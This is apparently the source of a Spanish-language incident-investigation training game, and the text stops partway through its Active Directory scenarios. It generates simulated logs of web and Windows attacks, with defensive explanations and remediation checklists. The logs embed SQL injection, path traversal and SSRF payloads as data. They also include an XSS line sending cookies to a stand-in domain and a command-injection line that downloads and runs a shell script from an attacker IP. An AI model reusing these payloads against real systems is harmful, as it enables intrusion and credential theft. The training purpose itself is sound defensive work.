"use strict";
// ======================================================================
// NetLab — Red vs Blue: modos de INVESTIGACIÓN (Web y Windows / Active Directory)
// El ataque YA ocurrió en los logs: tú lo encuentras, dices qué técnica es y lo contienes.
// Todo es simulado y se califica exacto (sin IA); la IA solo elige qué oleada te lanza.
// ======================================================================
const INV = { modo: null, gen: null };
const DUR_INV = { facil: 360, normal: 240, dificil: 170, pesadilla: 110 };
const OLEADAS_INV = { facil: 4, normal: 5, dificil: 6, pesadilla: 7 };
const iA = (a) => a[Math.floor(Math.random() * a.length)];
const iN = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
const iMezcla = (a) => a.map((x) => [Math.random(), x]).sort((p, q) => p[0] - q[0]).map((p) => p[1]);
const iIpExt = () => `${iA(["185.220.101", "45.155.205", "103.75.190", "91.240.118", "194.26.29", "77.91.124", "179.43.128"])}.${iN(2, 250)}`;
const iIpInt = () => `10.10.${iN(1, 30)}.${iN(10, 250)}`;
const i2 = (n) => String(n).padStart(2, "0");

/** Reloj de un caso: cada evento avanza unos segundos. */
function relojInv() {
  let t = new Date(2026, 10, iN(1, 28), iN(0, 23), iN(0, 59), iN(0, 59));
  return (sMin = 1, sMax = 8) => { t = new Date(t.getTime() + iN(sMin, sMax) * 1000); return `${i2(t.getHours())}:${i2(t.getMinutes())}:${i2(t.getSeconds())}`; };
}

// ---------------------------------------------------------------- validadores de contención
const reIp = (ip) => ip.replace(/\./g, "\\.");
function bloqueaIp(txt, ip) {
  const r = reIp(ip);
  return [new RegExp(`iptables\\s+(-A|-I|--append|--insert)\\s+INPUT\\b[^\\n]*-s\\s+${r}(\\/32)?\\b[^\\n]*-j\\s+(DROP|REJECT)`, "i"),
    new RegExp(`ufw\\s+(insert\\s+\\d+\\s+)?deny\\s+(from\\s+)?${r}(\\/32)?\\b`, "i"),
    new RegExp(`(^|\\n|\\s)deny\\s+${r}(\\/32)?\\s*;`, "i"),
    new RegExp(`fail2ban-client\\s+set\\s+\\S+\\s+banip\\s+${r}\\b`, "i")].some((x) => x.test(txt));
}
function deshabilitaCuenta(txt, u, extra = []) {
  const r = u.replace(/[.$]/g, "\\$&");
  return [new RegExp(`Disable-ADAccount\\s+(-Identity\\s+)?["']?([\\w.-]+\\\\)?${r}["']?(\\s|$)`, "i"),
    new RegExp(`net\\s+user\\s+["']?${r}["']?\\s+\\/active:no`, "i"), ...extra].some((x) => x.test(txt));
}

// ---------------------------------------------------------------- ruido de fondo
function ruidoWeb(E, n) {
  const pag = ["/", "/index.php", "/productos.php?id=3", "/productos.php?id=12", "/css/estilo.css", "/js/app.js", "/img/logo.png", "/carrito", "/contacto", "/login.php", "/favicon.ico"];
  const ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Firefox/132.0", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"];
  const ips = Array.from({ length: 5 }, () => (Math.random() < 0.5 ? iIpInt() : `${iN(23, 200)}.${iN(1, 250)}.${iN(1, 250)}.${iN(2, 250)}`));
  for (let k = 0; k < n; k++) { const p = iA(pag); E({ ip: iA(ips), metodo: "GET", ruta: p, estado: iA([200, 200, 200, 304]), bytes: p.endsWith(".png") ? 18342 : iN(900, 9000), ua: iA(ua) }); }
}
function ruidoAd(E, n, dom, dc) {
  const us = ["jlopez", "mgarcia", "aperez", "srodriguez", "cmartinez", "dhernandez", "lruiz"];
  for (let k = 0; k < n; k++) {
    const u = iA(us), ws = `WS-${iA(["FIN", "RH", "VENTAS", "TI"])}-${iN(10, 40)}`, x = Math.random();
    if (x < 0.35) E({ id: 4624, equipo: iA(["SRV-FILE01", "SRV-APP02", dc]), usuario: `${dom}\\${u}`, ip: iIpInt(), detalle: `LogonType 3 · Kerberos · desde ${ws}` });
    else if (x < 0.55) E({ id: 4769, equipo: dc, usuario: `${u}@${dom}.LOCAL`, ip: iIpInt(), detalle: `ServiceName: ${iA(["cifs/SRV-FILE01", "HTTP/intranet", "ldap/" + dc])} · TicketEncryptionType: 0x12` });
    else if (x < 0.7) E({ id: 4768, equipo: dc, usuario: u, ip: iIpInt(), detalle: "TGT pedido · PreAuthType: 2 · TicketEncryptionType: 0x12" });
    else if (x < 0.85) E({ id: 4634, equipo: iA(["SRV-FILE01", ws]), usuario: `${dom}\\${u}`, ip: "-", detalle: "Logoff" });
    else E({ id: 4688, equipo: ws, usuario: `${dom}\\${u}`, ip: "-", detalle: `Proceso: ${iA(["C:\\Program Files\\Microsoft Office\\EXCEL.EXE", "C:\\Windows\\explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"])}` });
  }
}

// ====================================================================== WEB
const COL_WEB = [["hora", "Hora"], ["ip", "IP"], ["metodo", "Método"], ["ruta", "Petición"], ["estado", "Estado"], ["bytes", "Bytes"], ["ua", "User-Agent"]];
function casoWeb(armar) {
  const reloj = relojInv(), filas = [];
  const E = (f, s1, s2) => { const x = { hora: reloj(s1, s2), ...f }; filas.push(x); return x; };
  const c = armar(E);
  return { columnas: COL_WEB, filas, filtroAyuda: "Filtro: ip=185.  estado=500  ruta=union  ua=sqlmap  (o texto libre)", ...c,
    cmd: { texto: `Escribe la regla que bloquea a ${"la IP atacante"} (iptables, ufw o nginx).`, ejemplo: `sudo ufw deny from ${c.ip}`, valida: (t) => bloqueaIp(t, c.ip) } };
}
const ESC_WEB = {
  sqli: () => casoWeb((E) => {
    const ip = iIpExt(), param = iA(["id", "cat", "producto"]), pag = iA(["/productos.php", "/articulo.php", "/catalogo.php"]), tabla = iA(["usuarios", "clientes", "admins"]);
    const ua = RB.dif === "dificil" || RB.dif === "pesadilla" ? "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0" : "sqlmap/1.8.4#stable (https://sqlmap.org)";
    ruidoWeb(E, 10);
    const q = (s, estado, bytes) => E({ ip, metodo: "GET", ruta: `${pag}?${param}=7${s}`, estado, bytes, ua }, 1, 3);
    q("", 200, 5120); q("'", 500, 312); q("%20AND%201=1", 200, 5120); q("%20AND%201=2", 200, 980); q("%20ORDER%20BY%205--", 500, 298);
    q("%20ORDER%20BY%204--", 200, 5120); q("%20UNION%20SELECT%201,2,3,4--", 200, 5133);
    q("%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables--", 200, 8890);
    q(`%20UNION%20SELECT%201,usuario,password,4%20FROM%20${tabla}--`, 200, 24576);
    ruidoWeb(E, 6);
    return { ip, titulo: `Errores 500 y respuestas enormes en ${pag}`, alerta: `El WAF está en modo solo-registro y marcó patrones raros en ${pag}. Un cliente pidió de golpe una respuesta de 24 KB donde lo normal son 5 KB.`,
      preguntas: [{ q: "¿Qué IP atacó?", r: ip }, { q: "¿Qué parámetro es vulnerable?", r: param },
        { q: "¿Qué tabla terminó volcando en la última petición?", r: tabla }],
      tecnica: "Inyección SQL (SQLi)",
      pista: "Filtra por estado=500: los errores de base de datos suelen ser el primer rastro. Luego sigue a esa IP.",
      checks: [["Corregir el código con consultas parametrizadas (prepared statements)", 1], ["Forzar el cambio de contraseñas de las cuentas expuestas", 1],
        ["Activar reglas de WAF contra SQLi (p. ej. OWASP CRS en ModSecurity)", 1], ["Reiniciar Apache y cerrar el ticket", 0],
        ["Borrar el access.log para que no quede rastro", 0], ["Mover el sitio al puerto 8080", 0]],
      explica: `Comilla → error 500 (rompió la consulta), AND 1=1 vs 1=2 → páginas distintas (inyección booleana), ORDER BY para contar columnas y UNION SELECT para leer otras tablas. El salto de 5 KB a 24 KB fue el volcado de ${tabla}. ATT&CK T1190 (Exploit Public-Facing Application).` };
  }),
  xss: () => casoWeb((E) => {
    const ip = iIpExt(), dom = iA(["c00kie-jar.xyz", "stats-cdn.top", "img-analytics.click"]), adm = iA(["/admin/panel.php", "/admin/usuarios", "/backoffice/"]);
    const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0";
    const link = `/buscar?q=%3Cscript%3Edocument.location%3D%27http://${dom}/c?%27%2Bdocument.cookie%3C/script%3E`;
    ruidoWeb(E, 8);
    E({ ip, metodo: "GET", ruta: "/buscar?q=zapatos", estado: 200, bytes: 4210, ua });
    E({ ip, metodo: "GET", ruta: "/buscar?q=%3Cb%3Ehola%3C/b%3E", estado: 200, bytes: 4188, ua });
    E({ ip, metodo: "GET", ruta: "/buscar?q=%3Cscript%3Ealert(1)%3C/script%3E", estado: 200, bytes: 4201, ua });
    const n = iN(3, 5), vict = Array.from({ length: n }, () => iIpInt());
    ruidoWeb(E, 4);
    for (const v of vict) E({ ip: v, metodo: "GET", ruta: link, estado: 200, bytes: 4230, ua: iA(["Mozilla/5.0 (Windows NT 10.0) Edge/131.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0"]) }, 20, 90);
    E({ ip, metodo: "GET", ruta: adm, estado: 200, bytes: 15880, ua }, 30, 60);
    ruidoWeb(E, 5);
    return { ip, titulo: "Varios empleados abrieron el mismo enlace de búsqueda", alerta: "Mesa de ayuda reporta sesiones que se cierran solas tras dar clic a un enlace del buscador del sitio que llegó por chat.",
      preguntas: [{ q: "¿A qué dominio manda el script las cookies robadas?", r: dom }, { q: "¿Cuántas víctimas (IPs distintas) abrieron el enlace?", r: String(n) },
        { q: "¿Qué página de administración abrió el atacante con la sesión robada?", r: adm, alt: [adm.replace(/\/$/, "")] }],
      tecnica: "Cross-Site Scripting (XSS)",
      pista: "Busca ruta=script. %3C es '<' y %3E es '>': decodifica la URL para leer el script.",
      checks: [["Codificar la salida (output encoding) del parámetro q", 1], ["Marcar la cookie de sesión como HttpOnly", 1], ["Invalidar las sesiones de las víctimas", 1],
        ["Bloquear el puerto 443", 0], ["Desactivar JavaScript en el servidor", 0], ["Borrar el access.log", 0]],
      explica: "Primero probó si el buscador refleja HTML (<b>), luego alert(1) y al final un script que manda document.cookie a su dominio. Con la cookie de un admin entró al panel sin contraseña (secuestro de sesión). HttpOnly impide que JavaScript lea la cookie." };
  }),
  traversal: () => casoWeb((E) => {
    const ip = iIpExt(), param = iA(["archivo", "file", "doc"]), ua = "curl/8.5.0";
    ruidoWeb(E, 9);
    const q = (v, estado, bytes) => E({ ip, metodo: "GET", ruta: `/descargar.php?${param}=${v}`, estado, bytes, ua }, 1, 4);
    q("manual.pdf", 200, 88120); q("../manual.pdf", 404, 210); q("../../etc/passwd", 404, 210); q("../../../../etc/passwd", 200, 1874);
    q("../../../../etc/shadow", 403, 199); q("....//....//....//etc/hostname", 200, 12); q("../../../../var/www/html/config.php", 200, 642);
    ruidoWeb(E, 5);
    return { ip, titulo: "Descargas de archivos que no existen en el sitio", alerta: "Muchos 404 seguidos en /descargar.php y luego respuestas 200 con tamaños que no corresponden a ningún PDF del catálogo.",
      preguntas: [{ q: "¿Qué parámetro abusa?", r: param }, { q: "¿Cuál fue el PRIMER archivo del sistema que logró leer (ruta completa)?", r: "/etc/passwd", alt: ["etc/passwd"] },
        { q: "¿Qué archivo de la aplicación con credenciales logró leer? (nombre)", r: "config.php", alt: ["/var/www/html/config.php"] }],
      tecnica: "Path traversal / Inclusión de archivos locales (LFI)",
      pista: "Filtra ruta=.. y ordena mentalmente por estado: los 200 son los que sí leyó.",
      checks: [["Validar el nombre contra una lista blanca de archivos permitidos", 1], ["Rotar las credenciales de la base de datos que estaban en config.php", 1],
        ["Resolver la ruta canónica (realpath/basename) y negar lo que salga de la carpeta de descargas", 1], ["Dar permisos 777 a /var/www", 0],
        ["Bloquear solo la cadena '../' y nada más", 0], ["Reiniciar el servidor", 0]],
      explica: "Cada ../ sube una carpeta: con suficientes llega a / y lee /etc/passwd. ....// es una evasión: si el filtro borra '../' una sola vez, queda '../'. El 403 de shadow fue por permisos del sistema, no por la app. config.php suele traer usuario y contraseña de la base de datos." };
  }),
  bruta: () => casoWeb((E) => {
    const ip = iIpExt(), ua = iA(["Mozilla/5.0 (Hydra)", "python-requests/2.32.3"]), n = iN(25, 45);
    ruidoWeb(E, 8);
    for (let k = 0; k < n; k++) E({ ip, metodo: "POST", ruta: "/login.php", estado: 200, bytes: 1530, ua }, 0, 1);
    const ok = E({ ip, metodo: "POST", ruta: "/login.php", estado: 302, bytes: 0, ua }, 0, 1);
    E({ ip, metodo: "GET", ruta: "/panel/", estado: 200, bytes: 12044, ua });
    ruidoWeb(E, 6);
    return { ip, titulo: "Ráfaga de inicios de sesión al panel", alerta: `Más de ${n} POST a /login.php en menos de un minuto desde el mismo origen.`,
      preguntas: [{ q: "¿Desde qué IP?", r: ip }, { q: "¿Cuántos intentos fallidos hubo antes de entrar?", r: String(n) },
        { q: "¿A qué hora (HH:MM:SS) logró entrar?", r: ok.hora }],
      tecnica: "Fuerza bruta al login web",
      pista: "Un login fallido devuelve la misma página (200, mismo tamaño); el exitoso redirige (302).",
      checks: [["Límite de intentos o bloqueo temporal (rate limiting / fail2ban)", 1], ["Agregar MFA al panel", 1], ["Cambiar la contraseña de la cuenta comprometida y cerrar sus sesiones", 1],
        ["Cambiar el texto del botón de login", 0], ["Desactivar los logs de acceso", 0], ["Reiniciar la base de datos", 0]],
      explica: "En un access.log no se ve la contraseña, pero se ve el patrón: muchos POST iguales con la misma respuesta (fallo) y luego un 302 (éxito) seguido de una página interna. ATT&CK T1110.001." };
  }),
  dirbust: () => casoWeb((E) => {
    const ip = iIpExt(), herr = iA([["gobuster/3.6", "gobuster"], ["Mozilla/5.0 (compatible; Nikto/2.5.0)", "nikto"], ["Fuzz Faster U Fool v2.1.0-dev", "ffuf", "fuzz faster u fool"]]);
    const resp = iA(["backup.zip", "respaldo_2026.tar.gz", "db_old.sql.gz"]);
    ruidoWeb(E, 8);
    const lista = iMezcla(["admin", "administrator", "old", "test", "dev", "tmp", "phpmyadmin", "wp-admin", "server-status", ".env", "uploads", "api", "private", "cgi-bin", "debug", "config", "install", "logs"]);
    let n404 = 0;
    for (const w of lista) { E({ ip, metodo: "GET", ruta: `/${w}`, estado: 404, bytes: 210, ua: herr[0] }, 0, 1); n404++; }
    E({ ip, metodo: "GET", ruta: "/robots.txt", estado: 200, bytes: 67, ua: herr[0] }, 0, 1);
    E({ ip, metodo: "GET", ruta: "/.git/HEAD", estado: 200, bytes: 23, ua: herr[0] }, 0, 1);
    for (const w of ["backup", "db", "site"]) { E({ ip, metodo: "GET", ruta: `/${w}`, estado: 404, bytes: 210, ua: herr[0] }, 0, 1); n404++; }
    E({ ip, metodo: "GET", ruta: `/${resp}`, estado: 200, bytes: 48211873, ua: herr[0] }, 0, 1);
    ruidoWeb(E, 5);
    return { ip, titulo: "Cientos de 404 en segundos", alerta: "El monitoreo marca un pico de errores 404 y una descarga de 48 MB en el sitio público.",
      preguntas: [{ q: "¿Qué herramienta usó, según el User-Agent? (solo el nombre)", r: herr[1], alt: herr[2] ? [herr[2]] : [] }, { q: "¿Qué archivo de respaldo quedó expuesto y se descargó?", r: resp, alt: ["/" + resp] },
        { q: "¿Cuántas peticiones de esa IP dieron 404?", r: String(n404) }],
      tecnica: "Enumeración de directorios (fuzzing de contenido)",
      pista: "Filtra por la IP del pico y busca los estado=200: son lo que encontró.",
      checks: [["Quitar del webroot el respaldo y la carpeta .git", 1], ["Revisar el respaldo: si trae contraseñas o datos, rotarlas y evaluar la fuga", 1],
        ["Limitar peticiones por IP (rate limiting)", 1], ["Agregar el respaldo a robots.txt para esconderlo", 0], ["Cambiar los 404 por 200", 0], ["Reiniciar Apache", 0]],
      explica: "Las herramientas de fuzzing prueban miles de nombres de una lista de palabras: casi todo da 404 y lo interesante son los 200/301/403. Un .git o un respaldo en el webroot es una fuga grave (código, contraseñas). robots.txt no esconde nada: lo lee cualquiera. ATT&CK T1595.003." };
  }),
  cmdi: () => casoWeb((E) => {
    const ip = iIpExt(), ip2 = iIpExt(), sep = iA([";", "|"]), ua = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0";
    const s = encodeURIComponent(sep);
    ruidoWeb(E, 8);
    const q = (v, bytes) => E({ ip, metodo: "GET", ruta: `/herramientas/ping.php?host=8.8.8.8${v}`, estado: 200, bytes, ua }, 2, 8);
    q("", 612); q(`${s}id`, 671); q(`${s}whoami`, 630); q(`${s}cat%20/etc/passwd`, 2480); q(`${s}wget%20http://${ip2}/x.sh%20-O%20/tmp/x.sh`, 640); q(`${s}sh%20/tmp/x.sh`, 615);
    ruidoWeb(E, 5);
    return { ip, titulo: "La herramienta de ping del sitio devuelve cosas raras", alerta: "Las respuestas de /herramientas/ping.php crecieron de tamaño y el firewall de salida vio una descarga desde el servidor web.",
      preguntas: [{ q: "¿Qué parámetro es vulnerable?", r: "host" }, { q: "¿Desde qué IP intentó descargar su script?", r: ip2 },
        { q: "¿Qué carácter usó para encadenar comandos? (decodificado)", r: sep }],
      tecnica: "Inyección de comandos del sistema operativo",
      pista: "%3B es ';' y %7C es '|'. Busca ruta=ping y lee qué viene después de la IP.",
      checks: [["No pasar la entrada a la shell: validar que 'host' sea una IP", 1], ["Aislar el servidor y revisar /tmp (el script descargado)", 1],
        [`Bloquear ${ip2} en el firewall de salida`, 1], ["Filtrar solo la palabra 'cat'", 0], ["Darle sudo a www-data para que no falle", 0], ["Borrar el access.log", 0]],
      explica: "La app arma algo como 'ping -c 1 ' + host y lo manda a la shell: con ; o | el atacante agrega sus propios comandos y corren como www-data. Primero confirma (id, whoami), luego lee archivos y por último descarga y ejecuta su script. ATT&CK T1059.004." };
  }),
  webshell: () => casoWeb((E) => {
    const ip = iIpExt(), nom = `avatar_${iN(10, 99)}.php`, p = iA(["cmd", "c", "x"]), ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0";
    ruidoWeb(E, 8);
    E({ ip, metodo: "GET", ruta: "/perfil", estado: 200, bytes: 6120, ua });
    E({ ip, metodo: "POST", ruta: "/perfil/subir_foto.php", estado: 200, bytes: 88, ua });
    const cmds = ["whoami", "uname%20-a", "cat%20/etc/passwd", "ls%20-la%20/var/www"];
    for (const c of cmds) E({ ip, metodo: "GET", ruta: `/uploads/${nom}?${p}=${c}`, estado: 200, bytes: iN(40, 2400), ua }, 5, 20);
    ruidoWeb(E, 5);
    return { ip, titulo: "Peticiones a un .php dentro de /uploads", alerta: "La carpeta /uploads solo debería servir imágenes, pero hay peticiones a un archivo PHP con parámetros.",
      preguntas: [{ q: "¿Cómo se llama la webshell?", r: nom, alt: ["/uploads/" + nom] }, { q: "¿Qué parámetro usa para mandar comandos?", r: p },
        { q: "¿Cuál fue el primer comando que ejecutó?", r: "whoami" }],
      tecnica: "Subida de archivos maliciosos (webshell)",
      pista: "Filtra ruta=uploads y mira qué hay después del '?'.",
      checks: [["Borrar la webshell y buscar otras (find /var/www -name '*.php' -newer index.php)", 1], ["Validar el tipo real del archivo y guardar las subidas fuera del webroot", 1],
        ["Desactivar la ejecución de PHP en /uploads", 1], ["Renombrarla a .txt y dejarla para analizar en producción", 0], ["Dar permisos 777 a /uploads", 0], ["Reiniciar el servidor", 0]],
      explica: "El formulario de foto aceptó un .php; como /uploads ejecuta PHP, el atacante obtuvo una 'terminal' por HTTP. Cada petición con ?cmd= es un comando en el servidor. ATT&CK T1505.003 (Web Shell)." };
  }),
  ssrf: () => casoWeb((E) => {
    const ip = iIpExt(), rol = iA(["web-prod-role", "app-s3-lector", "ec2-backend"]), ua = "python-requests/2.32.3";
    ruidoWeb(E, 8);
    const q = (u, estado, bytes) => E({ ip, metodo: "GET", ruta: `/api/vista-previa?url=${encodeURIComponent(u)}`, estado, bytes, ua }, 2, 6);
    q("https://example.com", 200, 1290); q("http://127.0.0.1:8080/", 200, 3411); q("http://127.0.0.1:6379/", 500, 288);
    q("http://169.254.169.254/latest/meta-data/", 200, 312); q("http://169.254.169.254/latest/meta-data/iam/security-credentials/", 200, String(rol).length);
    q(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${rol}`, 200, 1312);
    ruidoWeb(E, 5);
    return { ip, titulo: "La vista previa de enlaces pide direcciones internas", alerta: "La función que muestra la vista previa de un enlace (el servidor descarga la URL) empezó a recibir direcciones de la red interna y de la nube.",
      preguntas: [{ q: "¿Qué parámetro abusa?", r: "url" }, { q: "¿Qué IP del servicio de metadatos de la nube consultó?", r: "169.254.169.254" },
        { q: "¿De qué rol (IAM) leyó las credenciales?", r: rol }],
      tecnica: "Server-Side Request Forgery (SSRF)",
      pista: "Filtra ruta=url y decodifica: %3A es ':' y %2F es '/'. 169.254.169.254 es la dirección de metadatos de la nube.",
      checks: [["Permitir solo destinos de una lista blanca y negar rangos privados y link-local (resolviendo el DNS antes)", 1], ["Rotar de inmediato las credenciales del rol expuesto y revisar su uso", 1],
        ["Exigir IMDSv2 (token) en el servicio de metadatos", 1], ["Bloquear solo la palabra 'localhost'", 0], ["Reiniciar el servidor web", 0], ["Borrar el access.log", 0]],
      explica: "SSRF: el atacante hace que TU servidor pida URLs por él. Primero probó una URL normal, luego servicios internos (8080, Redis en 6379) y al final el servicio de metadatos de la nube, que entrega credenciales temporales del rol de la instancia. Desde el Top 10:2025 el SSRF está dentro de A01 (control de acceso roto). ATT&CK T1190 + T1552.005 (Cloud Instance Metadata API). Defensa: OWASP SSRF Prevention Cheat Sheet." };
  }),
  idor: () => casoWeb((E) => {
    const ip = iIpExt(), propio = iN(5100, 5900), ua = "python-requests/2.32.3", n = iN(12, 20);
    ruidoWeb(E, 8);
    E({ ip, metodo: "POST", ruta: "/api/v1/login", estado: 200, bytes: 412, ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" });
    E({ ip, metodo: "GET", ruta: `/api/v1/pedidos/${propio}`, estado: 200, bytes: 1840, ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" }, 5, 20);
    let leidos = 0;
    for (let k = 1; k <= n; k++) {
      const ok = Math.random() < 0.8;
      if (ok) leidos++;
      E({ ip, metodo: "GET", ruta: `/api/v1/pedidos/${propio + k}`, estado: ok ? 200 : 404, bytes: ok ? iN(1500, 2600) : 96, ua }, 0, 1);
    }
    ruidoWeb(E, 5);
    return { ip, titulo: "Un cliente consulta pedidos que no son suyos", alerta: "Una cuenta normal de cliente hizo decenas de consultas seguidas a la API de pedidos, con números consecutivos, en menos de un minuto.",
      preguntas: [{ q: "¿Qué endpoint de la API abusa? (sin el número)", r: "/api/v1/pedidos", alt: ["/api/v1/pedidos/", "api/v1/pedidos"] },
        { q: "¿Cuál es el número de SU propio pedido (el que consultó desde el navegador)?", r: String(propio) },
        { q: "¿Cuántos pedidos ajenos logró leer (respuestas 200)?", r: String(leidos) }],
      tecnica: "Referencia directa insegura a objetos (IDOR / BOLA)",
      pista: "Filtra ruta=pedidos: su pedido lo abrió con navegador; luego cambia el User-Agent y empieza a sumar 1 al número.",
      checks: [["Verificar en el servidor que cada pedido pertenece al usuario de la sesión (autorización por objeto)", 1], ["Avisar a los clientes cuyos pedidos se leyeron y evaluar la fuga", 1],
        ["Alertar y limitar la enumeración (muchos ids distintos y seguidos por sesión)", 1], ["Esconder el número del pedido en el JavaScript", 0], ["Cambiar la petición de GET a POST", 0], ["Borrar el access.log", 0]],
      explica: "La API devuelve el pedido que pidas sin revisar si es tuyo: basta cambiar el número. Es el riesgo #1 de APIs (API1:2023 BOLA) y parte de A01:2025 (control de acceso roto). Usar UUID en vez de números ayuda, pero la defensa real es revisar la autorización por objeto en cada petición. ATT&CK T1190." };
  }),
  xxe: () => casoWeb((E) => {
    const ip = iIpExt(), archivo = iA(["/etc/passwd", "/var/www/html/.env", "/etc/hosts"]), ua = "curl/8.5.0";
    const grande = archivo === "/etc/passwd" ? iN(1800, 2600) : archivo.endsWith(".env") ? iN(700, 1200) : iN(220, 400);
    ruidoWeb(E, 8);
    const q = (estado, bytes) => E({ ip, metodo: "POST", ruta: "/api/importar-catalogo?formato=xml", estado, bytes, ua }, 3, 12);
    q(200, 231); q(400, 118); q(200, 233); const r = q(200, grande); q(500, 341);
    ruidoWeb(E, 5);
    return { ip, titulo: "Importaciones de catálogo con respuestas raras", alerta: `El WAF en modo registro guardó una importación XML con una entidad externa (DOCTYPE + ENTITY SYSTEM) y la respuesta fue mucho más grande de lo normal. Archivo al que apunta la entidad: ${archivo}`,
      preguntas: [{ q: "¿Qué endpoint recibe el XML? (sin parámetros)", r: "/api/importar-catalogo", alt: ["api/importar-catalogo"] },
        { q: "¿Qué archivo del servidor intentó leer?", r: archivo }, { q: "¿De cuántos bytes fue la respuesta que devolvió ese archivo?", r: String(r.bytes) }],
      tecnica: "XML External Entity (XXE)",
      pista: "Las importaciones normales responden ~230 bytes: busca la respuesta 200 que se sale de ese tamaño.",
      checks: [["Desactivar DTD y entidades externas en el parser XML (o usar una librería segura como defusedxml)", 1], ["Rotar los secretos que hubiera en el archivo leído y revisar el servidor", 1],
        ["Aceptar JSON en lugar de XML donde se pueda y validar contra un esquema", 1], ["Limitar solo el tamaño del XML", 0], ["Cambiar la extensión del endpoint", 0], ["Reiniciar el servidor", 0]],
      explica: "El parser XML resolvía entidades externas: el atacante definió una entidad que apunta a un archivo local y el servidor la sustituyó en la respuesta. El 400 fue un XML mal formado y el 500 otro intento fallido. En el Top 10:2025 cae en A02 (mala configuración). ATT&CK T1190. Defensa: OWASP XML External Entity Prevention Cheat Sheet." };
  }),
};

// ====================================================================== WINDOWS / ACTIVE DIRECTORY
const COL_AD = [["hora", "Hora"], ["id", "Event ID"], ["equipo", "Equipo"], ["usuario", "Usuario"], ["ip", "IP"], ["detalle", "Detalle"]];
function casoAd(armar) {
  const reloj = relojInv(), filas = [], dom = iA(["CORP", "ACME", "NETLAB", "CONTOSO"]), dc = iA(["DC01", "DC-MX01"]);
  const E = (f, s1, s2) => { const x = { hora: reloj(s1, s2), ...f }; filas.push(x); return x; };
  const c = armar(E, dom, dc);
  return { columnas: COL_AD, filas, filtroAyuda: "Filtro: id=4769  usuario=jlopez  detalle=0x17  equipo=DC01  (o texto libre)", ...c,
    cmd: { texto: `Escribe el comando de PowerShell que deshabilita la cuenta ${c.cuentaTxt || "comprometida"}.`, ejemplo: `Disable-ADAccount -Identity ${c.cuenta}`,
      valida: (t) => deshabilitaCuenta(t, c.cuenta, c.cmdExtra || []) } };
}
const ESC_AD = {
  kerberoasting: () => casoAd((E, dom, dc) => {
    const u = iA(["mgarcia", "aperez", "lruiz"]), ws = `WS-${iA(["FIN", "RH", "VENTAS"])}-${iN(10, 40)}`, ip = iIpInt();
    const spns = iMezcla(["MSSQLSvc/SRV-SQL01:1433", "HTTP/intranet", "HTTP/sharepoint", "CIFS/SRV-FILE02", "svc_backup/SRV-BK01", "MSSQLSvc/SRV-SQL02:1433", "exchangeAB/EX01", "svc_web/SRV-WEB01"]).slice(0, iN(5, 8));
    ruidoAd(E, 10, dom, dc);
    E({ id: 4624, equipo: dc, usuario: `${dom}\\${u}`, ip, detalle: `LogonType 3 · Kerberos · desde ${ws}` });
    for (const s of spns) E({ id: 4769, equipo: dc, usuario: `${u}@${dom}.LOCAL`, ip, detalle: `ServiceName: ${s} · TicketEncryptionType: 0x17 · TicketOptions: 0x40810000` }, 0, 1);
    ruidoAd(E, 8, dom, dc);
    return { cuenta: u, titulo: `Ráfaga de tickets de servicio pedidos por ${u}`, alerta: `El DC registró en segundos muchas solicitudes de tickets de servicio (TGS) con cifrado débil, todas desde ${ws}.`,
      preguntas: [{ q: "¿Qué cuenta pidió los tickets? (sin dominio)", r: u }, { q: "¿Qué tipo de cifrado de ticket delata el ataque? (hex)", r: "0x17", alt: ["rc4", "rc4-hmac", "0x00000017"] },
        { q: "¿Cuántos tickets de servicio pidió en la ráfaga?", r: String(spns.length) }],
      tecnica: "Kerberoasting (T1558.003)",
      pista: "Filtra id=4769 y compara el TicketEncryptionType: lo normal es 0x12 (AES).",
      checks: [["Cambiar las contraseñas de las cuentas de servicio por otras largas (25+) o usar gMSA", 1], ["Quitar RC4 y forzar AES en las cuentas de servicio", 1],
        [`Investigar ${ws}, desde donde se pidieron`, 1], ["Reiniciar el controlador de dominio", 0], ["Borrar los SPN de todas las cuentas", 0], ["Desactivar Kerberos y usar solo NTLM", 0]],
      explica: "Cualquier usuario del dominio puede pedir un ticket de servicio; el ticket va cifrado con la contraseña de la cuenta de servicio. El atacante pide muchos con RC4 (0x17, más fácil de crackear) y los rompe fuera de línea. Señales: 4769 en ráfaga, muchos SPN distintos, cifrado 0x17." };
  }),
  asrep: () => casoAd((E, dom, dc) => {
    const v = iA(["svc_scanner", "kiosko01", "invitado.rh"]), ip = iIpExt(), atac = iA(["jlopez", "aperez"]);
    ruidoAd(E, 10, dom, dc);
    E({ id: 4768, equipo: dc, usuario: v, ip, detalle: "TGT pedido · PreAuthType: 0 · TicketEncryptionType: 0x17" }, 2, 6);
    E({ id: 4768, equipo: dc, usuario: v, ip, detalle: "TGT pedido · PreAuthType: 0 · TicketEncryptionType: 0x17" }, 0, 2);
    ruidoAd(E, 6, dom, dc);
    E({ id: 4624, equipo: "SRV-FILE01", usuario: `${dom}\\${v}`, ip, detalle: "LogonType 3 · Kerberos" }, 120, 400);
    ruidoAd(E, 4, dom, dc);
    return { cuenta: v, titulo: `TGT sin preautenticación para ${v}`, alerta: "Una IP externa a la VPN pidió tickets de Kerberos (AS-REQ) sin preautenticación y, horas después, esa cuenta inició sesión.",
      cmdExtra: [new RegExp(`Set-ADAccountControl\\s+(-Identity\\s+)?["']?${v}["']?\\s+-DoesNotRequirePreAuth\\s+\\$false`, "i")],
      preguntas: [{ q: "¿Qué cuenta no exige preautenticación?", r: v }, { q: "¿Desde qué IP se pidió su TGT?", r: ip }, { q: "¿Qué valor de PreAuthType lo delata?", r: "0" }],
      tecnica: "AS-REP Roasting (T1558.004)",
